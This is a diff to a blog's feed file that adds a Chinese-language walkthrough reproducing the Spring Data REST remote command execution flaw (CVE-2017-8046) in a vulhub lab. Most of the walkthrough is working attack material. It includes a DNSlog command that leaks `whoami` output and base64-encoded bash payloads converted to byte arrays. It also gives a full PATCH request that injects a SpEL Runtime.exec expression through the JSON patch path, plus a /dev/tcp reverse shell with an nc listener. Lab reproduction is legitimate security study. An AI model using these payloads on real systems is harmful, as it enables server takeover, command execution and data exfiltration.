@@ -4,6 +4,39 @@
   
     
     <entry>
+      <title>Spring Data Rest远程命令执行漏洞(CVE-2017-8046)</title>
+      <link href="/2022/05/06/Spring-Data-Rest/"/>
+      <url>/2022/05/06/Spring-Data-Rest/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Spring-Data-Rest远程命令执行漏洞"><a href="#Spring-Data-Rest远程命令执行漏洞" class="headerlink" title="Spring Data Rest远程命令执行漏洞"></a>Spring Data Rest远程命令执行漏洞</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>Spring Data REST是一个构建在Spring Data之上，为了帮助开发者更加容易地开发REST风格的Web服务。在REST API的Patch方法中，path的值被传入<code>setValue</code>，导致执行了SpEL表达式，触发远程命令执行漏洞。</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote><p>pivotal Spring Data REST &lt; 2.5.12 2.6.7 3.0 RC3<br>pivotal Spring Boot &lt; 2.0.0M4<br>pivotal Spring Data &lt; Kay-RC3</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/spring/CVE-2017-8046/docker-compose up -d</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>http://192.168.3.151:8080</code></p><p><img src="/2022/05/06/Spring-Data-Rest/image-20220506193255638.png" alt="image-20220506193255638"></p><p>可以看到这个东西</p><p>访问<code>http://192.168.3.151:8080/customers/1</code></p><p><img src="/2022/05/06/Spring-Data-Rest/image-20220506193353650.png" alt="image-20220506193353650"></p><p>打开<a href="http://dnslog.cn/">dnslog</a>，获取一个随机的dns</p><p><code>rmakrf.dnslog.cn</code></p><p><img src="/2022/05/06/Spring-Data-Rest/image-20220506193958215.png" alt="image-20220506193958215"></p><p>构造payload</p><pre><code>curl `whoami`.rmakrf.dnslog.cn</code></pre><p>然后打开<a href="https://x.hacking8.com/?post=293">base64</a>，转换一下</p><p><img src="/2022/05/06/Spring-Data-Rest/image-20220506194628834.png" alt="image-20220506194628834"></p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;echo,Y3VybCBgd2hvYW1pYC5ybWFrcmYuZG5zbG9nLmNu&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;</span></code></pre><p>把上面那一段转换成ascii码</p><p><img src="/2022/05/06/Spring-Data-Rest/image-20220506195048044.png" alt="image-20220506195048044"></p><p>用<code>PATCH</code>请求来修改</p><pre><code>PATCH /customers/1 HTTP/1.1Host: 192.168.3.151:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/json-patch+jsonContent-Length: 202[&#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,51,86,121,98,67,66,103,100,50,104,118,89,87,49,112,89,67,53,121,98,87,70,114,99,109,89,117,90,71,53,122,98,71,57,110,76,109,78,117,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125&#125;))/lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; &#125;]</code></pre><p>把这个包传过去看看</p><p><img src="/2022/05/06/Spring-Data-Rest/image-20220506195236520.png" alt="image-20220506195236520"></p><p>在dns中出来了</p><p><img src="/2022/05/06/Spring-Data-Rest/image-20220506195217529.png" alt="image-20220506195217529"></p><h3 id="构造反弹shell"><a href="#构造反弹shell" class="headerlink" title="构造反弹shell"></a>构造反弹shell</h3><pre class=" language-Linux"><code class="language-Linux">bash -i >& /dev/tcp/192.168.3.134/4444 0>&1</code></pre><p>先base64编码</p><p><img src="/2022/05/06/Spring-Data-Rest/image-20220506195524050.png" alt="image-20220506195524050"></p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTM0LzQ0NDQgMD4mMQ==&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;</span></code></pre><p>然后ascii码转换</p><p><img src="/2022/05/06/Spring-Data-Rest/image-20220506195615346.png" alt="image-20220506195615346"></p><p>设置监听端口</p><pre class=" language-Linux"><code class="language-Linux">nc -lvvp 4444</code></pre><p>把上面那东西替换，再次把包送过去</p><p><img src="/2022/05/06/Spring-Data-Rest/image-20220506195846351.png" alt="image-20220506195846351"></p><p>成了！</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 环境搭建 </tag>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> 网络安全 </tag>
+            
+            <tag> CVE </tag>
+            
+            <tag> Spring </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Spring-WebFlow远程代码执行漏洞(CVE-2017-4971)</title>
       <link href="/2022/05/06/Spring-WebFlow/"/>
       <url>/2022/05/06/Spring-WebFlow/</url>
